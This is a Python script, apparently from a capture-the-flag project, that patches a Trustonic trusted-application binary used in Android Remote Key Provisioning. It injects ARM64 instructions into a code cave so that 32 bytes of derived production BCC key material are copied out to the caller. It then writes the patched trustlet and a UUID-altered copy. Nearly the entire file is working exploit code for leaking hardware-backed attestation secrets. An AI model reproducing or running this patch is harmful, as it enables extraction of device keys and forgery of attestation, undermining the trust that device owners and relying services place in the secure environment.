#!/usr/bin/env python3
"""Direct-only leak of the 32-byte production RKP BCC key material.

The production GenerateCertificateRequest path derives 32 bytes using the
literal label ``rkp_bcc_km``.  Immediately after that derivation succeeds,
this patch copies the bytes from the TA stack into the caller's ProtectedData
output buffer, reports a 32-byte output length, and returns success through the
normal cleanup path.

This is intended only for the authorized CTF direct mcOpenTrustlet client.  It
must not be mounted into the Android system KeyMint/RKPD path.
"""

from pathlib import Path
import hashlib
import struct


ROOT = Path(__file__).resolve().parents[4]
SRC = (
    ROOT
    / "正规目录_按目标分类"
    / "目标二_提取RKP"
    / "05_输入与支撑材料"
    / "source_binaries"
    / "vendor_app_mcRegistry"
    / "0706000000000000000000000000004d.tlbin"
)
OUTDIR = (
    ROOT
    / "正规目录_按目标分类"
    / "目标二_提取RKP"
    / "03_patch与二进制"
    / "patched_binaries"
    / "patched_ta"
)

TEXT_BASE = 0x1000
TEXT_OFF = 0xD0

# In the production branch of the protected-data builder:
#   0x20410 loads the 10-byte label "rkp_bcc_km"
#   0x20450 calls the internal KDF
#   0x20454 branches to failure if the KDF failed
#   0x20458 is therefore reached only with the derived 32 bytes at sp+0x1738
HOOK = 0x20458
CAVE = 0x411AC
MEMCPY = 0x50F0
CLEANUP_RETURN = 0x202C4
SEED_STACK_OFFSET = 0x1738
OUTPUT_LEN = 32


def off(va: int) -> int:
    return TEXT_OFF + (va - TEXT_BASE)


def enc_b(src: int, dst: int, *, link: bool = False) -> bytes:
    delta = dst - src
    if delta % 4:
        raise ValueError(f"unaligned branch {src:#x}->{dst:#x}")
    imm = delta // 4
    if not (-(1 << 25) <= imm < (1 << 25)):
        raise ValueError(f"branch out of range {src:#x}->{dst:#x}")
    opcode = 0x94000000 if link else 0x14000000
    return struct.pack("<I", opcode | (imm & 0x03FFFFFF))


def word(value: int) -> bytes:
    return struct.pack("<I", value)


def main() -> None:
    original = SRC.read_bytes()
    patched = bytearray(original)

    # ldr x1, [sp,#0xa8] is the original instruction at the hook.
    expected_hook = bytes.fromhex("e15740f9")
    actual_hook = bytes(patched[off(HOOK) : off(HOOK) + 4])
    if actual_hook != expected_hook:
        raise SystemExit(
            f"hook mismatch at {HOOK:#x}: got {actual_hook.hex()} "
            f"expected {expected_hook.hex()}"
        )

    cave_size = 0x40
    actual_cave = bytes(patched[off(CAVE) : off(CAVE) + cave_size])
    if actual_cave != bytes(cave_size):
        raise SystemExit(f"code cave at {CAVE:#x} is not empty")

    # x0 = ProtectedData output pointer saved at [sp,#0x88]
    # x1 = sp + 0x1738 (derived production BCC material)
    # memcpy(x0, x1, 32)
    # *saved_output_len_ptr = 32
    # w28 = 0; branch through the function's normal cleanup/return path
    snippet = b"".join(
        [
            word(0xF94047E0),  # ldr x0,[sp,#0x88]
            word(0x914007E1),  # add x1,sp,#1,lsl#12
            word(0x911CE021),  # add x1,x1,#0x738
            word(0x52800402),  # mov w2,#32
            enc_b(CAVE + 0x10, MEMCPY, link=True),
            word(0xF9404BE1),  # ldr x1,[sp,#0x90] (output length pointer)
            word(0xD2800400),  # mov x0,#32
            word(0xF9000020),  # str x0,[x1]
            word(0x5280001C),  # mov w28,#0
            enc_b(CAVE + 0x24, CLEANUP_RETURN),
        ]
    )
    if len(snippet) > cave_size:
        raise SystemExit(f"snippet too large: {len(snippet)}")

    patched[off(HOOK) : off(HOOK) + 4] = enc_b(HOOK, CAVE)
    patched[off(CAVE) : off(CAVE) + len(snippet)] = snippet

    OUTDIR.mkdir(parents=True, exist_ok=True)
    system = OUTDIR / "0706000000000000000000000000004d.rkp_bcc_seedleak.tlbin"
    system.write_bytes(patched)

    direct = bytearray(patched)
    expected_uuid = bytes.fromhex("0706000000000000000000000000004d")
    if direct[0x18:0x28] != expected_uuid:
        raise SystemExit(f"unexpected MCLF UUID: {direct[0x18:0x28].hex()}")
    direct[0x27] = 0x4E
    direct_path = OUTDIR / "0706000000000000000000000000004e.rkp_bcc_seedleak.tlbin"
    direct_path.write_bytes(direct)

    print("source", SRC)
    print("source_sha256", hashlib.sha256(original).hexdigest())
    print("system_direct_only", system)
    print("system_sha256", hashlib.sha256(patched).hexdigest())
    print("direct", direct_path)
    print("direct_sha256", hashlib.sha256(direct).hexdigest())
    print("hook", hex(HOOK), "cave", hex(CAVE), "snippet_len", len(snippet))
    print("seed_stack_offset", hex(SEED_STACK_OFFSET), "output_len", OUTPUT_LEN)


if __name__ == "__main__":
    main()
